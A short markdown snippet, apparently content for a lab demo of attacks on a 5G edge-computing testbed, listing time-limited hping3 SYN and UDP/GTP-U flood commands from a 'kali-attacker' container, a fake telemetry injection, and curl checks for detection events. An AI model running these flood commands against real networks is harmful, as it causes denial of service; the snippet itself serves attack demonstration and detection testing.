options.content:
### Controlled lab-only demo commands

**MEC SYN pressure:**  
`timeout 15s docker exec kali-attacker hping3 -S --flood -p 5000 10.0.0.45`

**UPF-facing UDP/GTP-U test:**  
`timeout 10s docker exec kali-attacker hping3 --udp --flood -p 2152 10.0.0.22`

**Telemetry injection detection:**  
POST invalid `speed_kmh: 999` to `http://10.0.0.45:5000/telemetry`

**Evidence:**  
`curl http://localhost:5001/metrics | grep -E "tamper|rejected|attack|anomaly"`  
`curl http://localhost:5001/events`
